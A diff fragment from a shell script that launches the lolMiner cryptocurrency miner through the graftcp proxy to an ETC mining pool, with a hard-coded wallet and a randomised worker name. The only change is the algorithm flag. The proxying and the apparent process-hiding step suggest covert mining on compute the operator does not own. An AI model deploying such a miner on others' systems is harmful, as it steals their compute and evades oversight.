@@ -39,4 +39,4 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo ETC --pool us-etc.2miners.com:1010 --user 0x2a22a8f933f746c02b16e455756c9835ea556bdc.$(echo $(shuf -i 1-999 -n 1)-LOL)
+./graftcp/graftcp ./lolMiner --algo ETCHASH --pool us-etc.2miners.com:1010 --user 0x2a22a8f933f746c02b16e455756c9835ea556bdc.$(echo $(shuf -i 1-999 -n 1)-LOL)
